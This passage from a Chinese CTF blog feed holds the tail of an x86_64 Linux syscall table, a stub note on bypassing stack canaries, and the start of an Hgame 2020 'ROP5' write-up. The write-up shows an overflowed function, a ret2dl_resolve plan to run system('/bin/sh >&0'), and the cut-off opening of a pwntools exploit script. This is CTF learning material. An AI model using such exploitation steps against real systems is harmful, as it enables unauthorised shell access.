*pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>198</td><td>sys_lremovexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>199</td><td>sys_fremovexattr</td><td>int fd</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>200</td><td>sys_tkill</td><td>pid_t pid</td><td>ing sig</td><td></td><td></td><td></td><td></td></tr><tr><td>201</td><td>sys_time</td><td>time_t *tloc</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>202</td><td>sys_futex</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td>203</td><td>sys_sched_setaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>204</td><td>sys_sched_getaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>205</td><td>sys_set_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>206</td><td>sys_io_setup</td><td>unsigned nr_events</td><td>aio_context_t *ctxp</td><td></td><td></td><td></td><td></td></tr><tr><td>207</td><td>sys_io_destroy</td><td>aio_context_t ctx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>208</td><td>sys_io_getevents</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td></td><td></td></tr><tr><td>209</td><td>sys_io_submit</td><td>aio_context_t ctx_id</td><td>long nr</td><td>struct iocb **iocbpp</td><td></td><td></td><td></td></tr><tr><td>210</td><td>sys_io_cancel</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td></td><td></td><td></td></tr><tr><td>211</td><td>sys_get_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>212</td><td>sys_lookup_dcookie</td><td>u64 cookie64</td><td>long buf</td><td>long len</td><td></td><td></td><td></td></tr><tr><td>213</td><td>sys_epoll_create</td><td>int size</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>214</td><td>sys_epoll_ctl_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>215</td><td>sys_epoll_wait_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>216</td><td>sys_remap_file_pages</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td></td></tr><tr><td>217</td><td>sys_getdents64</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>218</td><td>sys_set_tid_address</td><td>int *tidptr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>219</td><td>sys_restart_syscall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>220</td><td>sys_semtimedop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td>const struct timespec *timeout</td><td></td><td></td></tr><tr><td>221</td><td>sys_fadvise64</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td></td><td></td></tr><tr><td>222</td><td>sys_timer_create</td><td>const clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t *created_timer_id</td><td></td><td></td><td></td></tr><tr><td>223</td><td>sys_timer_settime</td><td>timer_t timer_id</td><td>int flags</td><td>const struct itimerspec *new_setting</td><td>struct itimerspec *old_setting</td><td></td><td></td></tr><tr><td>224</td><td>sys_timer_gettime</td><td>timer_t timer_id</td><td>struct itimerspec *setting</td><td></td><td></td><td></td><td></td></tr><tr><td>225</td><td>sys_timer_getoverrun</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>226</td><td>sys_timer_delete</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>227</td><td>sys_clock_settime</td><td>const clockid_t which_clock</td><td>const struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>228</td><td>sys_clock_gettime</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>229</td><td>sys_clock_getres</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>230</td><td>sys_clock_nanosleep</td><td>const clockid_t which_clock</td><td>int flags</td><td>const struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td></tr><tr><td>231</td><td>sys_exit_group</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>232</td><td>sys_epoll_wait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td></td><td></td></tr><tr><td>233</td><td>sys_epoll_ctl</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td></td><td></td></tr><tr><td>234</td><td>sys_tgkill</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td></tr><tr><td>235</td><td>sys_utimes</td><td>char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td><td></td></tr><tr><td>236</td><td>sys_vserver</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>237</td><td>sys_mbind</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td>238</td><td>sys_set_mempolicy</td><td>int mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td></td><td></td><td></td></tr><tr><td>239</td><td>sys_get_mempolicy</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td></td></tr><tr><td>240</td><td>sys_mq_open</td><td>const char *u_name</td><td>int oflag</td><td>mode_t mode</td><td>struct mq_attr *u_attr</td><td></td><td></td></tr><tr><td>241</td><td>sys_mq_unlink</td><td>const char *u_name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>242</td><td>sys_mq_timedsend</td><td>mqd_t mqdes</td><td>const char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const stuct timespec *u_abs_timeout</td><td></td></tr><tr><td>243</td><td>sys_mq_timedreceive</td><td>mqd_t mqdes</td><td>char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int *u_msg_prio</td><td>const struct timespec *u_abs_timeout</td><td></td></tr><tr><td>244</td><td>sys_mq_notify</td><td>mqd_t mqdes</td><td>const struct sigevent *u_notification</td><td></td><td></td><td></td><td></td></tr><tr><td>245</td><td>sys_mq_getsetattr</td><td>mqd_t mqdes</td><td>const struct mq_attr *u_mqstat</td><td>struct mq_attr *u_omqstat</td><td></td><td></td><td></td></tr><tr><td>246</td><td>sys_kexec_load</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td></td><td></td></tr><tr><td>247</td><td>sys_waitid</td><td>int which</td><td>pid_t upid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td></td></tr><tr><td>248</td><td>sys_add_key</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td></td><td></td></tr><tr><td>249</td><td>sys_request_key</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td></td><td></td></tr><tr><td>250</td><td>sys_keyctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td></td></tr><tr><td>251</td><td>sys_ioprio_set</td><td>int which</td><td>int who</td><td>int ioprio</td><td></td><td></td><td></td></tr><tr><td>252</td><td>sys_ioprio_get</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>253</td><td>sys_inotify_init</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>254</td><td>sys_inotify_add_watch</td><td>int fd</td><td>const char *pathname</td><td>u32 mask</td><td></td><td></td><td></td></tr><tr><td>255</td><td>sys_inotify_rm_watch</td><td>int fd</td><td>__s32 wd</td><td></td><td></td><td></td><td></td></tr><tr><td>256</td><td>sys_migrate_pages</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *old_nodes</td><td>const unsigned long *new_nodes</td><td></td><td></td></tr><tr><td>257</td><td>sys_openat</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td></tr><tr><td>258</td><td>sys_mkdirat</td><td>int dfd</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>259</td><td>sys_mknodat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>unsigned dev</td><td></td><td></td></tr><tr><td>260</td><td>sys_fchownat</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td></td></tr><tr><td>261</td><td>sys_futimesat</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td></tr><tr><td>262</td><td>sys_newfstatat</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td></td><td></td></tr><tr><td>263</td><td>sys_unlinkat</td><td>int dfd</td><td>const char *pathname</td><td>int flag</td><td></td><td></td><td></td></tr><tr><td>264</td><td>sys_renameat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td></tr><tr><td>265</td><td>sys_linkat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td>int flags</td><td></td></tr><tr><td>266</td><td>sys_symlinkat</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td><td></td></tr><tr><td>267</td><td>sys_readlinkat</td><td>int dfd</td><td>const char *pathname</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td></tr><tr><td>268</td><td>sys_fchmodat</td><td>int dfd</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td></tr><tr><td>269</td><td>sys_faccessat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>270</td><td>sys_pselect6</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timespec *tsp</td><td>void *sig</td></tr><tr><td>271</td><td>sys_ppoll</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>struct timespec *tsp</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td><td></td></tr><tr><td>272</td><td>sys_unshare</td><td>unsigned long unshare_flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>273</td><td>sys_set_robust_list</td><td>struct robust_list_head *head</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>274</td><td>sys_get_robust_list</td><td>int pid</td><td>struct robust_list_head **head_ptr</td><td>size_t *len_ptr</td><td></td><td></td><td></td></tr><tr><td>275</td><td>sys_splice</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>276</td><td>sys_tee</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>277</td><td>sys_sync_file_range</td><td>long fd</td><td>loff_t offset</td><td>loff_t bytes</td><td>long flags</td><td></td><td></td></tr><tr><td>278</td><td>sys_vmsplice</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>279</td><td>sys_move_pages</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void **pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td>280</td><td>sys_utimensat</td><td>int dfd</td><td>const char *filename</td><td>struct timespec *utimes</td><td>int flags</td><td></td><td></td></tr><tr><td>281</td><td>sys_epoll_pwait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td>282</td><td>sys_signalfd</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td></td><td></td><td></td></tr><tr><td>283</td><td>sys_timerfd_create</td><td>int clockid</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>284</td><td>sys_eventfd</td><td>unsigned int count</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>285</td><td>sys_fallocate</td><td>long fd</td><td>long mode</td><td>loff_t offset</td><td>loff_t len</td><td></td><td></td></tr><tr><td>286</td><td>sys_timerfd_settime</td><td>int ufd</td><td>int flags</td><td>const struct itimerspec *utmr</td><td>struct itimerspec *otmr</td><td></td><td></td></tr><tr><td>287</td><td>sys_timerfd_gettime</td><td>int ufd</td><td>struct itimerspec *otmr</td><td></td><td></td><td></td><td></td></tr><tr><td>288</td><td>sys_accept4</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td>int flags</td><td></td><td></td></tr><tr><td>289</td><td>sys_signalfd4</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td></td><td></td></tr><tr><td>290</td><td>sys_eventfd2</td><td>unsigned int count</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>291</td><td>sys_epoll_create1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>292</td><td>sys_dup3</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>293</td><td>sys_pipe2</td><td>int *filedes</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>294</td><td>sys_inotify_init1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>295</td><td>sys_preadv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>296</td><td>sys_pwritev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>297</td><td>sys_rt_tgsigqueueinfo</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td></tr><tr><td>298</td><td>sys_perf_event_open</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td></td></tr><tr><td>299</td><td>sys_recvmmsg</td><td>int fd</td><td>struct msghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td>struct timespec *timeout</td><td></td></tr><tr><td>300</td><td>sys_fanotify_init</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>301</td><td>sys_fanotify_mark</td><td>long fanotify_fd</td><td>long flags</td><td>__u64 mask</td><td>long dfd</td><td>long pathname</td><td></td></tr><tr><td>302</td><td>sys_prlimit64</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td></td><td></td></tr><tr><td>303</td><td>sys_name_to_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td></td></tr><tr><td>304</td><td>sys_open_by_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flags</td><td></td></tr><tr><td>305</td><td>sys_clock_adjtime</td><td>clockid_t which_clock</td><td>struct timex *tx</td><td></td><td></td><td></td><td></td></tr><tr><td>306</td><td>sys_syncfs</td><td>int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>307</td><td>sys_sendmmsg</td><td>int fd</td><td>struct mmsghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>308</td><td>sys_setns</td><td>int fd</td><td>int nstype</td><td></td><td></td><td></td><td></td></tr><tr><td>309</td><td>sys_getcpu</td><td>unsigned *cpup</td><td>unsigned *nodep</td><td>struct getcpu_cache *unused</td><td></td><td></td><td></td></tr><tr><td>310</td><td>sys_process_vm_readv</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>311</td><td>sys_process_vm_writev</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovcc *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>312</td><td>sys_kcmp</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td></td></tr><tr><td>313</td><td>sys_finit_module</td><td>int fd</td><td>const char __user *uargs</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>314</td><td>sys_sched_setattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>315</td><td>sys_sched_getattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>316</td><td>sys_renameat2</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>unsigned int flags</td><td></td></tr><tr><td>317</td><td>sys_seccomp</td><td>unsigned int op</td><td>unsigned int flags</td><td>const char __user *uargs</td><td></td><td></td><td></td></tr><tr><td>318</td><td>sys_getrandom</td><td>char __user *buf</td><td>size_t count</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>319</td><td>sys_memfd_create</td><td>const char __user *uname_ptr</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>320</td><td>sys_kexec_file_load</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char __user *cmdline_ptr</td><td>unsigned long flags</td><td></td></tr><tr><td>321</td><td>sys_bpf</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td></td><td></td><td></td></tr><tr><td>322</td><td>stub_execveat</td><td>int dfd</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>int flags</td><td></td></tr><tr><td>323</td><td>userfaultfd</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>324</td><td>membarrier</td><td>int cmd</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>325</td><td>mlock2</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>326</td><td>copy_file_range</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user * off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>327</td><td>preadv2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr><tr><td>328</td><td>pwritev2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr><tr><td>329</td><td>pkey_mprotect</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>330</td><td>pkey_alloc</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>331</td><td>pkey_free</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>332</td><td>statx</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>333</td><td>io_pgetevents</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>334</td><td>rseq</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>335</td><td>pkey_mprotect</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> pwn总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn学习笔记——花式绕过canary</title>
      <link href="/2020/02/27/note-bypass-canary/"/>
      <url>/2020/02/27/note-bypass-canary/</url>
      
        <content type="html"><![CDATA[<p>听binlep师傅说可以通过改TLS结构体绕过canary，于是赶紧学习一波，先挖个坑，明天再看。</p><p><a href="https://www.jianshu.com/p/c3624f5dd583" target="_blank" rel="noopener">https://www.jianshu.com/p/c3624f5dd583</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104479071" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/104479071</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-Hgame-ROP5-writeup</title>
      <link href="/2020/02/26/2020-Hgame-ROP5-writeup/"/>
      <url>/2020/02/26/2020-Hgame-ROP5-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题不难，算是<code>r2dl_resolve</code>的入门题。这几天开学在家自学，学到自闭，有一门课要连续上五天，每天自学100+页PPT，看两篇近两年内发布的论文，然后还要做persentation录成视频发给老师…截止时间是每天凌晨12点…PPT还要求是英文，课件也是英文…</p><p>这不，今天熬到十一点多，终于录完视频了，想着放松一下，随手翻出了Hgame的wp，看了看第四周的pwn，发现是<code>r2dl_resolve</code>的题目，还有现成的脚本，于是赶紧一键拿走。脚本作者是杭电vidar的<code>Veritas501</code>师傅，他博客里还有个x64的脚本，正好春节的时候有个x64的<code>r2dl_resolve</code>题还没做，先把脚本拿过来，明天再看hhh</p><h2 id="ROP5"><a href="#ROP5" class="headerlink" title="ROP5"></a>ROP5</h2><ul><li><p>题目描述：</p><blockquote><p>Do you know the Lv.5?<br>Just like Misaka Mikoto!</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/CTF@master/hgame2020/pwn/week4_1/ROP5" target="_blank" rel="noopener">ROP5</a></p></li><li><p>考察点：r2dl_resolve</p></li><li><p>难度：困难</p></li><li><p>初始分值：500</p></li><li><p>最终分值：500</p></li><li><p>完成人数：14</p></li></ul><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>漏洞函数如下，存在缓冲区溢出：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  undefined local_48 [<span class="number">68</span>];</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Are you the LEVEL5?"</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>,local_48,<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>读数据前关闭了stdout和stderr，无法向stdout打印数据，因此不能通过puts来泄漏libc地址</p><p>也就是说需要直接执行<code>system(&#39;/bin/sh &gt;&amp;0&#39;)</code>来获取shell，于是只能通过<code>r2dl_reslove</code>实现</p><p><a href="https://veritas501.space/" target="_blank" rel="noopener">Veritas501</a>师傅的文章有详细<code>r2dl_reslove</code>，还写了脚本，我就一键拿走了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./ROP5'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span 